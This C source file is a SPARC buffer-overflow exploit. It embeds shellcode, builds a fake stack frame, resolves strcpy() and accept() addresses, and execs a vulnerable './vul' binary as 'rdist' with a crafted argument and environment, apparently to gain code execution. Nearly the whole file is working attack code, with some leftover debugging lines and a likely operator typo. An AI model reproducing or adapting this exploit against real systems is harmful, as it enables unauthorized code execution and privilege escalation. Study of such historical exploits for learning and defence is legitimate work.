#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <dlfcn.h>

extern char**environ;

u_char sparc_shellcode[] =
"\x21\x12\x19\x5b\xa0\x14\x20\x6c\x23\x1b\xcb\x08\xa2\x14\x60\x57\x25\x1b\xdc\x9b\xa4\x14\xa0\x64\x27\x08\x42\x80\x90\x10\x20\x01\x92\x0b\x80\x0e\x94\x10\x20\x0e\x82\x10\x24\x04\x84\x03\xe0\x08\x91\xd0\x20\x08\x82\x10\x24\x01";

#define VULNERABLE_BUF_LENGTH 20

#define BUF_LENGTH 4+VULNERABLE_BUF_LENGTH

int main(int argc, char *argv[])
{
   char buf[BUF_LENGTH * 2 + 0x1000];
   char tempbuf[BUF_LENGTH * 2 + 0x1000];
   char teststring[BUF_LENGTH * 2 + 0x1000];
   char padding[128];
   char *env[10];
   char fakeframe[512];
   char platform[256];

   void *handle;
   long strcpy_addr;
   long dest_addr;

   u_char *char_p;
   u_long *long_p;
   int i;
   int pad=25;

   if (argc==2) pad+=atoi(argv[1]);

   char_p=buf;

   if (!(handle=dlopen(NULL,RTLD_LAZY)))
   {
      fprintf(stderr,"Can't dlopen myself.\n");
      exit(1);
   }

   if ((strcpy_addr=(long)dlsym(handle,"strcpy"))==NULL)
   {
      fprintf(stderr,"Can't find strcpy().\n");
      exit(1);
   }

   strcpy_addr-=4;

   if (!(strcpy_addr & 0xff) || !(strcpy_addr * 0xff00) ||
      !(strcpy_addr & 0xff0000) || !(strcpy_addr & 0xff000000))
   {
      fprintf(stderr,"the address of strcpy() contains a '0'. sorry.\n");
      exit(1);
   }

   printf("found strcpy() at %lx\n",strcpy_addr);

   if ((dest_addr=(long)dlsym(handle,"accept"))==NULL)
   {
      fprintf(stderr,"Can't find accept().\n");
      exit(1);
   }

   dest_addr=dest_addr & 0xffff0000;
   dest_addr+=0x1800c;

   if (!(dest_addr & 0xff) || !(dest_addr & 0xff00) ||
      !(dest_addr & 0xff0000) || !(dest_addr & 0xff000000))
   {
      fprintf(stderr,"the destination address contains a '0'. sorry.\n");
      exit(1);
   }

   printf("found shellcode destination at %lx\n",dest_addr);
   printf("my environ    is at %08x\n",environ);
   printf("my environ[0] is at %08x\n",environ[0]);


   memset(char_p,'A',BUF_LENGTH);

   long_p=(unsigned long *) (char_p+BUF_LENGTH);

   /* We don't care about the %l registers */

   *long_p++=0x2112195b;
   *long_p++=0xa014206c;
   *long_p++=0x231bcb08;
   *long_p++=0xa2146057;
   *long_p++=0x251bdc9b;
   *long_p++=0xdeadbeef;
   *long_p++=0xdeadbeef;
   *long_p++=0xdeadbeef;

   /* Here is the saved %i0-%i7 */

   *long_p++=0xdeadbeef;
   *long_p++=0xefffd378; // safe value for dereferencing
   *long_p++=0xefffd378; // safe value for dereferencing
   *long_p++=0xdeadbeef;
   *long_p++=0xdeadbeef;
   *long_p++=0xdeadbeef;
   *long_p++=0xeffffb78; // This is where our fake frame lives
//   *long_p++=strcpy_addr; // We return into strcpy

   //*long_p++=0xefffebe0; // ZZZZZ return addr
   *long_p++=0x108c0; // ZZZZZ return addr

   *long_p++=0;

   long_p=(long *)fakeframe;
   *long_p++=0xAAAAAAAA; // garbage
   *long_p++=0xdeadbeef; // %l0
   *long_p++=0xdeadbeef; // %l1
   *long_p++=0xdeadbeaf; // %l2
   *long_p++=0xdeadbeef; // %l3
   *long_p++=0xdeadbeaf; // %l4
   *long_p++=0xdeadbeef; // %l5
   *long_p++=0xdeadbeaf; // %l6
   *long_p++=0xdeadbeef; // %l7
   *long_p++=dest_addr; // %i0 - our destination (i just picked somewhere)
   *long_p++=0xeffffb18; // %i1 - our source
   *long_p++=0xdeadbeef;
   *long_p++=0xdeadbeef;
   *long_p++=0xdeadbeef;
   *long_p++=0xdeadbeef;
   *long_p++=0xeffffd18; // %fp - just has to be somewhere strcpy can use
   *long_p++=dest_addr-8; // %i7 - return into our shellcode
   *long_p++=0;

   sprintf(tempbuf,"blh=%s",buf);

   /* This gives us some padding to play with */

   memset(teststring,'B',BUF_LENGTH);
   teststring[BUF_LENGTH]=0;


#define PLATFORM_LEN 20

   pad+=21-PLATFORM_LEN;
   for (i=0;i<pad;padding[i++]='A')
      padding[i]=0;

   env[0]=sparc_shellcode;
   env[1]=&(fakeframe[2]);
   env[2]=teststring;
   env[3]=padding;
   env[4]=NULL;

   execle("./vul","rdist",tempbuf,"-c","/tmp/","${blh}",
      (char *)0,env);
   perror("execl failed");
}
